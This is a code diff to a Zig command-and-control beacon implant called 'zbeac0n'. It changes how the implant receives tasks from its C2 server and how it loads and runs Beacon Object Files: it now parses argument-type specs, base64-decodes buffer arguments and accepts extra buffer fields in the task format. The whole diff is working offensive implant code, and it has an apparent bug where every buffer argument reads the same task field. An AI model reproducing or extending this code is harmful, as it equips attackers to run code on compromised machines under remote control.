@@ -385,6 +385,9 @@ fn netHttpUnmasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionT
 //
 
 fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task_fields: [][]const u8) !void {
+
+    const first_buffer_index: u32 = 5;
+
     const bof_task_id = task_fields[0];
     //const bof_name = task_fields[1];
     const bof_path = task_fields[2];
@@ -407,8 +410,8 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
 
     // TODO: properly handle arg types!
     // get arguments specification string
-    //const args_spec = bof_header_iter.next() orelse return error.BadData;
-    _ = bof_header_iter.next() orelse return error.BadData;
+    const args_spec = bof_header_iter.next() orelse return error.BadData;
+    //_ = bof_header_iter.next() orelse return error.BadData;
 
     // get BOF return value type
     const no_ret_value = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "void") else false;
@@ -478,37 +481,49 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
     if (!std.mem.eql(u8, bof_argv, "")) {
         std.log.info("bof_argv: {s}", .{bof_argv});
 
-        var iter = std.mem.tokenizeScalar(u8, bof_argv, ' ');
+        var argv_iter = std.mem.tokenizeScalar(u8, bof_argv, ' ');
         var i: u32 = 0;
+        var buffer_index: u32 = first_buffer_index;
+
+        var buf_len: usize = 0;
+        var buf: ?[]u8 = null;
 
         // build 'bof_args' by parsing 'argv' and inspecting args_spec:
         // possible values for args_spec: iszZb
+        // adherence of argv elements to args_spec isn't checked, operator is responsible for it
         bof_args.begin();
-        while (iter.next()) |arg| {
-            std.log.info("Adding arg: {s}", .{arg});
+        for (args_spec) |arg_type| {
+            std.log.info("Adding arg: {c}", .{arg_type});
 
-            //if (args_spec[i] == 'b') {
-            //    const buf = if (root.object.get(arg)) |value| buf: {
-            //        const len = try state.base64_decoder.calcSizeForSlice(value.string);
-            //        const buf = try allocator.alloc(u8, len);
-            //        errdefer allocator.free(buf);
-            //        _ = try state.base64_decoder.decode(buf, value.string);
-            //        break :buf buf;
-            //    } else null;
-            //    defer if (buf) |b| allocator.free(b);
+            // handling of 'b' (buffer) argument type:
+            if (arg_type == 'b') {
+                if (!std.mem.eql(u8, task_fields[first_buffer_index], "")) {
+                    const value = task_fields[first_buffer_index];
+                    buf_len = try b64_decoder.calcSizeForSlice(value);
+                    buf = try allocator.alloc(u8, buf_len);
+                    if (buf) |b| {
+                        _ = try b64_decoder.decode(b, value);
 
-            //    std.log.info("buf: {s} {s}", .{ arg, buf.? });
+                        std.log.info("buf: {c} {s}", .{ arg_type, b });
 
-            //    const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
+                        // why trimming here?
+                        //const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
+                        //const buf_arg_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
 
-            //    const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
-            //    defer allocator.free(buf_len);
+                        const buf_arg_len = try std.fmt.allocPrint(allocator, "i:{d}", .{b.len});
+                        defer allocator.free(buf_arg_len);
 
-            //    try bof_args.add(buf_len);
-            //    try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
-            //} else {
-            try bof_args.add(arg);
-            //}
+                        try bof_args.add(buf_arg_len);
+                        try bof_args.add(std.mem.asBytes(&b.ptr));
+
+                        allocator.free(b);
+                        buffer_index += 1;
+                    }
+                }
+            } else {
+                const arg = argv_iter.next() orelse return error.BadData;
+                try bof_args.add(arg);
+            }
 
             i += 1;
         }
@@ -574,7 +589,7 @@ fn processTasks(allocator: std.mem.Allocator, state: *zbeac0n.State, resp_conten
     defer task_fields.deinit();
 
     // handle task from C2, valid task's format:
-    // taskID,cmdName{type:name},[URI],[bofHeader{execMode:argTypes:retValue{void|u8}:bofHash:[persist]}],[base64(argv)]
+    // taskID,cmdName{type:name},[URI],[bofHeader{execMode:argTypes:retValue{void|u8}:bofHash:[persist]}],[base64(argv)],[buffer0, ..., bufferN]
     var iter_task = std.mem.splitScalar(u8, resp_content, ',');
 
     const task_id = iter_task.next() orelse return error.BadData;
@@ -600,7 +615,12 @@ fn processTasks(allocator: std.mem.Allocator, state: *zbeac0n.State, resp_conten
     const argv = iter_task.next();
     if (argv) |a| try task_fields.append(a) else try task_fields.append("");
 
-    if (task_fields.items.len != 5)
+    while(iter_task.next()) |buffer| {
+        try task_fields.append(buffer);
+    } else
+        try task_fields.append("");
+
+    if (task_fields.items.len < 5)
         return error.BadData;
 
     iter_task.reset();
